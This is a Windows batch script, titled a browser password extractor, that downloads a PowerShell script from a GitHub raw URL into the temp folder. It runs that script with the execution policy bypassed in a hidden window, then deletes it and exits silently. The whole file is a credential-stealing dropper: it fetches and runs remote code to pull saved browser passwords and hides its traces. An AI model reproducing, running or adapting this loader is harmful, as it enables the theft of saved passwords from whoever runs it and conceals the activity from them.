@echo off
REM ===============================================
REM   Browser Password Extractor - Auto Downloader
REM   Credits: @09sychic
REM ===============================================

REM ===== CONFIG =====
set DOWNLOAD_URL=https://raw.githubusercontent.com/09sychic/spiderSense/refs/heads/main/spiderSense.ps1

REM ===== DOWNLOAD =====
echo [*] Downloading script...
PowerShell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP%\extract.ps1' -UseBasicParsing"

if not exist "%TEMP%\extract.ps1" (
    echo [!] Download failed!
    pause
    exit
)

echo [+] Download complete

REM ===== EXECUTE =====
echo [*] Running extraction...
PowerShell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\extract.ps1"

REM ===== CLEANUP =====
timeout /t 2 /nobreak >nul
del "%TEMP%\extract.ps1" 2>nul

REM Exit silently
exit
